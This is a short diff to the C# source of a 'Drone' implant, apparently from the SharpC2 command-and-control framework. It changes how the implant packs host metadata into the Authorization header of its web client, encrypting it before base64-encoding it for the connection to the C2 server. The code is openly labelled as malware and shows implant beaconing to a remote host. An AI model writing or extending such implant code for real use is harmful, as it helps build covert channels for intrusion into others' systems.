@@ -21,7 +21,7 @@ namespace Drone.Handlers
             _client = new WebClient {BaseAddress = $"{HttpScheme}://{ConnectAddress}:{ConnectPort}"};
             _client.Headers.Clear();
 
-            var encodedMetadata = Convert.ToBase64String(Metadata.Serialize());
+            var encodedMetadata = Convert.ToBase64String(Crypto.EncryptData(Metadata));
             _client.Headers.Add("X-Malware", "SharpC2");
             _client.Headers.Add("Authorization", $"Bearer {encodedMetadata}");
         }
